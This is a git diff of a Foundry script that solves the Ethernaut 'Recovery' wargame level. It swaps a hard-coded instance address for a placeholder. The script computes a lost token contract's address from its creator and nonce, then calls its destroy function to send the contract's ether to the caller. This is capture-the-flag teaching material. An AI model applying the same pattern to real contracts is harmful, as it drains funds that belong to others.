@@ -5,15 +5,11 @@ import "forge-std/Script.sol";
 import "../src/Ethernaut Challenge/17_Recovery.sol";
 
 contract ExploitScript is Script {
+    SimpleToken level17 = SimpleToken(payable(computeContractAddress(your_challenge_address, 1)));
     
-    SimpleToken level17 = SimpleToken(payable(computeContractAddress(0x178C19AA81eC0ae28D93a378a269c51704cBAd3D, 1)));
-
-
     function run() external {
         vm.startBroadcast();
-        
         level17.destroy(payable(msg.sender));
-
         vm.stopBroadcast();
     }
 
